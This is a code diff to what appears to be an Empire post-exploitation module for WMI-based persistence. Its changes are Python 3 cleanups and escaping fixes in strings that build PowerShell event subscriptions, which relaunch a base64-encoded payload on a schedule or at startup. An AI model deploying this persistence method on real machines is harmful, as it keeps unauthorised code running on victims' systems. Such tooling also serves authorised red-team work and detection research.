@@ -1,7 +1,4 @@
-from __future__ import print_function
-
 import os
-from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
@@ -9,7 +6,7 @@ from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -81,7 +78,7 @@ class Module(object):
             # read in an external file as the payload and build a
             #   base64 encoded version as encScript
             if os.path.exists(ext_file):
-                with open(ext_file, "r") as f:
+                with open(ext_file) as f:
                     file_data = f.read()
 
                 # unicode-base64 encode the script for -enc launching
@@ -161,7 +158,7 @@ class Module(object):
                 script += (
                     '$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{name=\''
                     + dummy_sub_name
-                    + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
+                    + "';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
                     + day_filter_dummy
                     + " AND (TargetInstance.Hour = "
                     + hour
@@ -180,7 +177,7 @@ class Module(object):
             script += (
                 '$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{name=\''
                 + sub_name
-                + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
+                + "';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
                 + day_filter
                 + " AND (TargetInstance.Hour = "
                 + hour
@@ -197,7 +194,7 @@ class Module(object):
             script = (
                 '$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{name=\''
                 + sub_name
-                + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
+                + "';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
             )
             status_msg += " with OnStartup WMI subsubscription trigger."
 
